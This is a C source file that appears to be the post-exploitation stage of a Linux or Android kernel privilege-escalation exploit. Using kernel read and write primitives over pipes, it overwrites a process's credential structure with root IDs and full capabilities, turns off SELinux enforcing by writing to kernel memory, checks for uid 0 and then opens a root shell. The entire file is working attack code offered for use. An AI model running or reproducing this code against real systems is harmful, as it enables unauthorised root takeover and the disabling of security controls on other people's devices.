#include "../include/privilege_escalation.h"
#include "../include/kernel_rw.h"
#include "../include/log.h"
#include "../include/privilege_escalation.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Offsets and constants – these should be in a shared header; I'll put them
// here for clarity.
#define OFFSET_TASK_STRUCT_CRED (offsetof(struct task_struct, cred))
#define OFFSET_CRED_UID (offsetof(struct cred, uid))
#define OFFSET_CRED_GID (offsetof(struct cred, gid))
#define OFFSET_CRED_SUID (offsetof(struct cred, suid))
#define OFFSET_CRED_SGID (offsetof(struct cred, sgid))
#define OFFSET_CRED_EUID (offsetof(struct cred, euid))
#define OFFSET_CRED_EGID (offsetof(struct cred, egid))
#define OFFSET_CRED_FSUID (offsetof(struct cred, fsuid))
#define OFFSET_CRED_FSGID (offsetof(struct cred, fsgid))
#define OFFSET_CRED_SECUREBITS (offsetof(struct cred, securebits))
#define OFFSET_CRED_CAP_INHERITABLE (offsetof(struct cred, cap_inheritable))
#define OFFSET_CRED_CAP_PERMITTED (offsetof(struct cred, cap_permitted))
#define OFFSET_CRED_CAP_EFFECTIVE (offsetof(struct cred, cap_effective))
#define OFFSET_CRED_CAP_BSET (offsetof(struct cred, cap_bset))
#define OFFSET_CRED_CAP_AMBIENT (offsetof(struct cred, cap_ambient))

void patch_cred(int pipefd[2], struct task_struct *task_struct,
                void *cred_address) {
  INFO("Patching cred at %p", cred_address);
  uint64_t cred_ptr = kernel_read_qword(cred_address, pipefd);
  if (!cred_ptr) {
    ERROR("Failed to read cred pointer");
    exit(EXIT_FAILURE);
  }
  struct cred *cred = (struct cred *)cred_ptr;
  INFO("cred structure at %p", cred);

  void *base = (void *)cred;
  kernel_write_dword(base + OFFSET_CRED_UID, GLOBAL_ROOT_UID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_GID, GLOBAL_ROOT_GID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_SUID, GLOBAL_ROOT_UID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_SGID, GLOBAL_ROOT_GID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_EUID, GLOBAL_ROOT_UID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_EGID, GLOBAL_ROOT_GID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_FSUID, GLOBAL_ROOT_UID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_FSGID, GLOBAL_ROOT_GID, pipefd);
  kernel_write_dword(base + OFFSET_CRED_SECUREBITS, SECUREBITS_DEFAULT, pipefd);
  kernel_write_qword(base + OFFSET_CRED_CAP_INHERITABLE, CAP_EMPTY_SET, pipefd);
  kernel_write_qword(base + OFFSET_CRED_CAP_PERMITTED, CAP_FULL_SET, pipefd);
  kernel_write_qword(base + OFFSET_CRED_CAP_EFFECTIVE, CAP_FULL_SET, pipefd);
  kernel_write_qword(base + OFFSET_CRED_CAP_BSET, CAP_FULL_SET, pipefd);
  kernel_write_qword(base + OFFSET_CRED_CAP_AMBIENT, CAP_EMPTY_SET, pipefd);

  SUCCESS("Cred patched successfully");
}

void disable_selinux_enforcing(int pipefd[2], void *nsproxy_address) {
  INFO("Disabling SELinux enforcing");
  uint64_t nsproxy = kernel_read_qword(nsproxy_address, pipefd);
  if (!nsproxy) {
    ERROR("Failed to read nsproxy");
    exit(EXIT_FAILURE);
  }
  uint64_t kernel_base = nsproxy - SYMBOL_OFFSET_init_nsproxy;
  void *selinux_enforcing =
      (void *)(kernel_base + SYMBOL_OFFSET_selinux_enforcing);
  INFO("nsproxy = 0x%lx, kernel base = 0x%lx, selinux_enforcing = %p", nsproxy,
       kernel_base, selinux_enforcing);

  int enabled = kernel_read_dword(selinux_enforcing, pipefd);
  if (enabled == 0) {
    INFO("SELinux already disabled");
    return;
  }
  kernel_write_dword(selinux_enforcing, 0, pipefd);
  if (kernel_read_dword(selinux_enforcing, pipefd) == 0) {
    SUCCESS("SELinux enforcing disabled");
  } else {
    ERROR("Failed to disable SELinux");
    exit(EXIT_FAILURE);
  }
}

void verify_root(void) {
  uid_t uid = getuid();
  INFO("Current uid = %d", uid);
  if (uid != 0) {
    ERROR("Not root (uid=%d)", uid);
    exit(EXIT_FAILURE);
  }
  SUCCESS("Root privileges confirmed");
}

void spawn_root_shell(void) {
  INFO("Spawning root shell...");
  printf("\n[!] Root shell – type 'exit' to return\n");
  system("/bin/sh");
}